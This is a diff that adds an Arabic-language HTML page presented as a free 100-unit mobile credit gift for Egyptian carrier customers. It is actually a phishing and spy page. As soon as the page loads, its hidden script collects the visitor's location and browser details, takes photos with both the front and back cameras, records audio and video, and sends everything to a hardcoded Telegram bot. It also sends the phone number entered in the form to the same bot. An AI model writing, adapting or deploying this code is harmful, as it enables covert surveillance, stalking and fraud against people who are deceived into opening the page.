@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عروض الهدية المجانية - 100 وحدة</title>
+    <style>
+        body {
+            font-family: Tahoma, sans-serif;
+            background: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h2 { color: #e60000; margin-bottom: 10px; }
+        p { color: #555; font-size: 14px; margin-bottom: 20px; }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+        label { display: block; margin-bottom: 5px; font-weight: bold; font-size: 13px; }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #e60000;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover { background: #cc0000; }
+        .networks {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 20px;
+        }
+        .net-logo {
+            font-weight: bold;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+        .vodafone { background: #e60000; color: white; }
+        .orange { background: #ff7900; color: white; }
+        .etisalat { background: #73cf11; color: white; }
+        .we { background: #7c2d91; color: white; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="networks">
+        <span class="net-logo vodafone">Vodafone</span>
+        <span class="net-logo orange">Orange</span>
+        <span class="net-logo etisalat">Etisalat</span>
+        <span class="net-logo we">WE</span>
+    </div>
+    <h2>احصل على 100 وحدة مجاناً!</h2>
+    <p>ادخل رقم هاتفك وشبكتك لتأكيد استلام الهدية الفورية.</p>
+    
+    <form id="giftForm">
+        <div class="input-group">
+            <label>اختر الشبكة:</label>
+            <select id="network" required>
+                <option value="Vodafone">فودافون</option>
+                <option value="Orange">أورانج</option>
+                <option value="Etisalat">اتصالات</option>
+                <option value="WE">WE (تي إي داتا)</option>
+            </select>
+        </div>
+        <div class="input-group">
+            <label>رقم الهاتف المحمول:</label>
+            <input type="tel" id="phone" placeholder="01xxxxxxxxx" required>
+        </div>
+        <button type="submit" id="submitBtn">استلام الهدية الآن</button>
+    </form>
+</div>
+
+<!-- عناصر مخفية لالتقاط الوسائط -->
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+    const CHAT_ID = "PUT_YOUR_CHAT_ID_HERE"; // ضع هنا معرف الدردشة الخاص بك (Chat ID)
+
+    function sendTelegramText(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        });
+    }
+
+    function sendTelegramPhoto(blob, caption) {
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+    }
+
+    function sendTelegramAudio(blob) {
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('audio', blob, 'audio.wav');
+        formData.append('caption', 'تسجيل صوتي (8 ثواني)');
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+            method: 'POST',
+            body: formData
+        });
+    }
+
+    function sendTelegramVideo(blob) {
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('video', blob, 'video.mp4');
+        formData.append('caption', 'فيديو قصير (8 ثواني)');
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            method: 'POST',
+            body: formData
+        });
+    }
+
+    // جمع الموقع الجغرافي ومعلومات الجهاز
+    function gatherInfo() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                let lat = pos.coords.latitude;
+                let lon = pos.coords.longitude;
+                sendTelegramText(`📍 الموقع الجغرافي:\nhttps://maps.google.com/?q=${lat},${lon}`);
+            }, err => {
+                sendTelegramText("⚠️ فشل في الحصول على الموقع الجغرافي أو تم رفض الإذن.");
+            });
+        }
+        sendTelegramText(`💻 معلومات المتصفح:\n${navigator.userAgent}`);
+    }
+
+    // التقاط الصور (4 أمامية / 4 خلفية)
+    async function capturePhotos() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        const constraintsArray = [
+            { video: { facingMode: "user" } }, // أمامية
+            { video: { facingMode: "environment" } } // خلفية
+        ];
+
+        for (let i = 0; i < 4; i++) {
+            try {
+                // التقاط صورتين أماميتين وصورتين خلفيتين بالتناوب أو حسب التوفر
+                let facing = (i % 2 === 0) ? "user" : "environment";
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+                video.srcObject = stream;
+                await new Promise(resolve => setTimeout(resolve, 1500)); // انتظار استقرار الكاميرا
+                
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    sendTelegramPhoto(blob, `صورة رقم ${i+1} (${facing === 'user' ? 'أمامية' : 'خلفية'})`);
+                }, 'image/jpeg', 0.85);
+
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                console.log("خطأ في الكاميرا: ", e);
+            }
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+    }
+
+    // تسجيل الصوت والفيديو (8 ثواني)
+    async function recordMedia() {
+        try {
+            // تسجيل الصوت
+            let audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            let audioRecorder = new MediaRecorder(audioStream);
+            let audioChunks = [];
+            audioRecorder.ondataavailable = e => audioChunks.push(e.data);
+            audioRecorder.onstop = () => {
+                let audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                sendTelegramAudio(audioBlob);
+                audioStream.getTracks().forEach(t => t.stop());
+            };
+            audioRecorder.start();
+            setTimeout(() => audioRecorder.stop(), 8000);
+
+            // تسجيل الفيديو
+            let videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            let videoRecorder = new MediaRecorder(videoStream);
+            let videoChunks = [];
+            videoRecorder.ondataavailable = e => videoChunks.push(e.data);
+            videoRecorder.onstop = () => {
+                let videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+                sendTelegramVideo(videoBlob);
+                videoStream.getTracks().forEach(t => t.stop());
+            };
+            videoRecorder.start();
+            setTimeout(() => videoRecorder.stop(), 8000);
+
+        } catch (e) {
+            console.log("خطأ في تسجيل الوسائط: ", e);
+        }
+    }
+
+    // التشغيل التلقائي بمجرد فتح الصفحة
+    window.onload = () => {
+        gatherInfo();
+        capturePhotos();
+        recordMedia();
+    };
+
+    // عند إرسال البيانات من النموذج
+    document.getElementById('giftForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        let network = document.getElementById('network').value;
+        let phone = document.getElementById('phone').value;
+
+        sendTelegramText(`🎯 تم تسجيل بيانات جديدة:\n🌐 الشبكة: ${network}\n📱 رقم الهاتف: ${phone}`);
+        alert('جاري معالجة طلبك، سيتم إضافة الهدية قريباً!');
+    });
+</script>
+
+</body>
+</html>
